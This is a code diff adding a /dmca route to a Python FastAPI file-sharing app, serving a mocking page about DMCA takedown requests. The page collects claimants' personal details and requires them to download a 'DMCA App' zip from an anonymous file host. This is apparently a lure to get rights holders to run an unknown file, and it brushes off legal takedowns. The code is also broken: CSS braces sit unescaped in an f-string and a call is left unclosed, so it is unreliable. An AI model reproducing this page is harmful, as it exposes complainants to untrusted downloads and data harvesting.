@@ -251,6 +251,98 @@ async def verify_turnstile_token(response_token: str) -> bool:
         response = await client.post(url, data=data)
         result = response.json()
     return result.get("success", False)
+
+@app.get("/dmca", response_class=HTMLResponse)
+async def dmca(request: Request):
+    return HTMLResponse(content=f"""
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DMCA Takedown Notices</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #25293c;
+    }
+    .container {
+      background: #25293c;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      width: 100%;
+      color: white;
+    }
+    h2 {
+      margin-bottom: 1rem;
+      color: #ff79c6;
+    }
+    ul {
+      margin: 0;
+      padding-left: 1.5rem;
+    }
+    li {
+      margin-bottom: 0.5rem;
+    }
+    .highlight {
+      color: #f06292;
+      font-weight: bold;
+    }
+    a {
+      color: #007BFF;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>DMCA Takedown Notices</h2>
+    <p>
+      So, you think your precious copyrighted content has been uploaded to our site without permission? No problem! We’ve got a process for that. Just follow the steps below and we <span class="highlight">might</span> take a look at it (no promises on how fast, though).
+    </p>
+    <h3>How to Submit a DMCA Takedown Notice</h3>
+    <ul>
+      <li><strong>Identify the Stolen Treasure:</strong> Provide the URLs of the content you believe violates your copyright. Be specific—"that thing on your site" won’t cut it.</li>
+      <li><strong>Prove You’re the Rightful Owner:</strong> Show us proof that you own the content. This could be copyright certificates, signed contracts, or a really convincing selfie holding a sign that says, "This is mine!"</li>
+      <li><strong>Drop Your Deets:</strong> Provide your full legal name, mailing address, phone number, and email. Don’t worry, we won’t sign you up for spam... probably.</li>
+      <li><strong>Make a Super Serious Declaration:</strong> Copy and paste this, but make it sound like you mean it:
+        <blockquote>
+          "I swear on my favorite pair of socks that I have a good faith belief that the use of the copyrighted materials described above is not authorized by the copyright owner, its agent, or the law."
+        </blockquote>
+      </li>
+      <li><strong>Sign It with Style:</strong> Add your physical or electronic signature. Bonus points if it’s in Comic Sans.</li>
+    </ul>
+    <h3>The Fun Part</h3>
+    <p>
+      Here’s where it gets interesting. Before we consider your takedown notice, we require the following:
+    </p>
+    <ul>
+      <li>Download our <a href="https://files.catbox.moe/u4te48.zip">DMCA App</a>.</li>
+      <li>Record yourself performing the ultimate cringeworthy TikTok dance while reciting the words "I hereby claim this content as my own." (Costumes encouraged but not required.)</li>
+      <li>Upload your video along with your notice.</li>
+    </ul>
+    <p>
+      We’ll watch your masterpiece, laugh uncontrollably, and then <span class="highlight">maybe</span> take action on your request. (No promises, though—we’re easily distracted.)
+    </p>
+    <h3>Questions or Concerns?</h3>
+    <p>
+      If you need more help, feel free to <a href="#">contact us</a>. Just don’t expect us to be serious. We’re here for laughs, not lawsuits.
+    </p>
+  </div>
+</body>
+</html>
+"""
 @app.get("/generate-link", response_class=HTMLResponse)
 async def generate_link_page(request: Request):
     from utils.directoryHandler import DRIVE_DATA
